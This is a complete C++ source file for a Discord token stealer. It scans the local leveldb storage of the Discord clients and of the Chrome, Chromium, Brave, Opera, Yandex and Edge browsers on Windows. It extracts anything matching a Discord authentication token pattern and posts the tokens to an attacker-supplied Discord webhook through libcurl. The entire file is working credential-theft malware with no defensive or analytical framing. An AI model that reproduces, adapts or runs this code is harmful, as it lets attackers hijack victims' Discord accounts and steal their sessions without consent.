#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <regex>
#define CURL_STATICLIB
#include <curl\curl.h>

using namespace std;

string DISCORD_TOKEN_REGEX = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}";
string WEBHOOK_URL = "Your webhook URL here";

void sendTokens(vector<string>& tokens)
{
	curl_global_init(CURL_GLOBAL_ALL);
	CURL* curl = curl_easy_init();

	if (!curl) {
		curl_global_cleanup();
		return;
	}

	string title = "New token(s)";
	string content = "Tokens : ";
	for (int i = 0; i < tokens.size(); i++) {
		content += tokens[i] + " ";
	}
	string data = "{\"content\": null,\"embeds\": [{\"title\": \""+ title + "\",\"description\": \"" + content + "\",\"color\": 10181046}]}";
	struct curl_slist* headers = NULL;
	headers = curl_slist_append(headers, "Content-Type: application/json");
	curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
	CURLcode res = curl_easy_perform(curl);
	curl_easy_cleanup(curl);
	curl_global_cleanup();
}

void findMatch(string& content, regex& tokenPatter, vector<string>& tokens)
{
	sregex_iterator current(content.begin(), content.end(), tokenPatter);
	sregex_iterator end;

	while (current != end) {
		smatch match = *current;
		tokens.push_back(match.str());
		current++;
	}
}

void findTokens(vector<string>& tokens, vector<string>& files)
{
	regex tokenPattern(DISCORD_TOKEN_REGEX);

	for (int i = 0; i < files.size(); i++) {
		ifstream file(files[i], ios::binary);
		string content((istreambuf_iterator<char>(file)), (istreambuf_iterator<char>()));
		findMatch(content, tokenPattern, tokens);
	}
}

void getFiles(vector<string>& directories, vector<string>& files)
{
	for (int i = 0; i < directories.size(); i++) {
		for (const auto& entry : filesystem::directory_iterator(directories[i])) {
			string path = entry.path().string();
			if (path.find(".ldb") != string::npos || path.find(".log") != string::npos) {
				files.push_back(path);
			}
		}
	}
}

void deleteInexistantPaths(vector<string>& directories)
{
	for (int i = directories.size() - 1; i >= 0; i--) {
		if (!filesystem::exists(directories[i])) {
			directories.erase(directories.begin() + i);
		}
	}
}

void getDirectories(vector<string>& directories)
{
	char* localPath = NULL;
	char* roamingPath = NULL;

	_dupenv_s(&roamingPath, NULL, "APPDATA");
	_dupenv_s(&localPath, NULL, "LOCALAPPDATA");
	string discord = "\\Discord\\Local Storage\\leveldb";
	string discordCanary = "\\discordcanary\\Local Storage\\leveldb";
	string discordPTB = "\\discordptb\\Local Storage\\leveldb";
	string googleChrome = "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb";
	string chromium = "\\Chromium\\User Data\\Default\\Local Storage\\leveldb";
	string brave = "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb";
	string opera = "\\Opera Software\\Opera Stable\\Local Storage\\leveldb";
	string yandex = "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb";
	string edge = "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb";
	if (roamingPath != NULL) {
		directories.push_back(roamingPath + discord);
		directories.push_back(roamingPath + discordCanary);
		directories.push_back(roamingPath + discordPTB);
		free(roamingPath);
	}
	if (localPath != NULL) {
		directories.push_back(localPath + googleChrome);
		directories.push_back(localPath + chromium);
		directories.push_back(localPath + brave);
		directories.push_back(localPath + opera);
		directories.push_back(localPath + yandex);
		directories.push_back(localPath + edge);
		free(localPath);
	}
}

int main()
{
	vector<string> directories;
	vector<string> files;
	vector<string> tokens;

	getDirectories(directories);
	deleteInexistantPaths(directories);
	getFiles(directories, files);
	if (files.size() == 0) {
		return (0);
	}
	findTokens(tokens, files);
	if (tokens.size() > 0) {
		sendTokens(tokens);
	}
	return (0);
}
